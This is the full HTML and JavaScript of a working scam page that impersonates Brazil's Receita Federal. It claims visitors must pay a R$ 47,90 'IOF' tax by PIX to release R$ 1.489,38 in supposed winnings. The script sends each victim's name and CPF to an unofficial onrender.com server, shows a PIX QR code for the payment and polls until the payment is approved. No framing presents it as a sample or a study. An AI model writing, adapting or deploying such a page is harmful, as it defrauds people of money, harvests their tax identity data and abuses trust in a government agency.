<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pagamento IOF | Receita Federal</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 480px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; position: relative; }

        /* HEADER RECEITA */
        .header { background-color: #0038a8; padding: 20px; text-align: center; }
        .logo-receita { height: 40px; filter: brightness(0) invert(1); }
        .content { padding: 20px; }

        /* AVISO */
        .warning-box { background-color: #fff9e6; border: 1px solid #ffeeba; color: #856404; padding: 15px; border-radius: 6px; font-size: 14px; margin-bottom: 20px; display: flex; gap: 10px; }
        h1 { font-size: 18px; font-weight: 800; color: #000; margin: 0 0 10px 0; }
        .description { font-size: 13px; color: #333; line-height: 1.5; margin-bottom: 20px; }
        .text-red { color: #d32f2f; font-weight: bold; }

        /* RESUMO */
        .summary-box { border: 1px solid #ddd; border-radius: 8px; margin-bottom: 25px; overflow: hidden; }
        .summary-header { background: #f9f9f9; padding: 15px; font-weight: 800; font-size: 16px; border-bottom: 1px solid #eee; }
        .summary-row { display: flex; justify-content: space-between; padding: 15px; font-size: 14px; border-bottom: 1px solid #f0f0f0; }
        .summary-row:last-child { border-bottom: none; }
        .val-gain { font-weight: 600; } .val-tax { color: #d32f2f; font-weight: 600; } .val-total { font-weight: 800; font-size: 16px; color: #000; }
        .tax-desc { font-size: 11px; color: #d32f2f; margin-top: 4px; display: block; }
        .info-pix { padding: 15px; background: #fdfdfd; font-size: 11px; color: #666; display: flex; align-items: center; gap: 5px; }

        /* FORMULARIO */
        .form-label { font-size: 13px; font-weight: bold; color: #333; margin-bottom: 5px; display: block; }
        .form-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 15px; margin-bottom: 15px; }

        /* BOTÃO */
        .btn-pay { background-color: #00c853; color: white; width: 100%; padding: 18px; border: none; border-radius: 6px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; margin-top: 10px; }
        .btn-pay:disabled { background-color: #ccc; }

        /* MODAL */
        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 300; align-items: center; justify-content: center; padding: 20px; }
        .qr-card { background: white; padding: 25px; border-radius: 10px; text-align: center; width: 100%; max-width: 350px; }
        .qr-img { width: 100%; margin: 15px 0; }
        .pix-code { background: #f0f0f0; padding: 10px; font-size: 11px; word-break: break-all; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="logo-receita"></div>
        <div class="content">
            <div class="warning-box"><span>⚠️</span><div><strong>Imposto (IOF) obrigatório</strong></div></div>
            <h1>Imposto sobre Operações Financeiras (IOF)</h1>
            <p class="description">O pagamento do IOF é obrigatório.<br><br><span class="text-red">* Necessário para receber o valor acumulado.</span></p>
            
            <div class="summary-box">
                <div class="summary-header">Resumo</div>
                <div class="summary-row"><span>Valor ganho</span><span class="val-gain">R$ 1.489,38</span></div>
                <div class="summary-row" style="background-color: #fff5f5;"><div><span>Valor a ser pago (IOF)</span><span class="tax-desc">Imposto sobre Operações</span></div><span class="val-tax">- R$ 47,90</span></div>
                <div class="summary-row"><span style="font-weight:bold;">Total a receber</span><span class="val-total">R$ 1.489,38</span></div>
                <div class="info-pix">Pagamento de R$47,90 processado via PIX imediato.</div>
            </div>

            <div class="form-section">
                <label class="form-label">Nome do Contribuinte</label>
                <input type="text" id="nome" class="form-input" placeholder="Nome Completo">
                <label class="form-label">CPF</label>
                <input type="tel" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
            </div>

            <button class="btn-pay" onclick="gerarPixIOF()">PAGAR IOF E LIBERAR VALOR</button>
        </div>
    </div>

    <div id="qr-screen">
        <div class="qr-card">
            <h3>Pagamento IOF</h3>
            <p style="font-size:14px;">Escaneie para finalizar.</p>
            <img id="qr-image" class="qr-img">
            <div id="pix-copia" class="pix-code"></div>
            <button class="btn-pay" style="padding:10px; font-size:14px;" onclick="copiarCodigo()">Copiar PIX</button>
            <div id="msg-sucesso" style="margin-top:15px; color:green; display:none;">✅ IMPOSTO PAGO!<br>Valor liberado.</div>
        </div>
    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";
        function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
        
        async function gerarPixIOF() {
            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-pay');
            if(n.length<3||c.length<11) return alert("Preencha Nome e CPF.");
            b.innerText="GERANDO..."; b.disabled=true;
            try {
                const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
                const d=await r.json();
                if(d.point_of_interaction){
                    document.getElementById('qr-image').src=`data:image/png;base64,${d.point_of_interaction.transaction_data.qr_code_base64}`;
                    document.getElementById('pix-copia').innerText=d.point_of_interaction.transaction_data.qr_code;
                    document.getElementById('qr-screen').style.display='flex';
                    monitor(d.id);
                } else { alert("Erro."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
            } catch(e){ alert("Erro."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
        }
        function monitor(id){ setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
        function copiarCodigo(){ navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Copiado!"); }
    </script>
</body>
</html>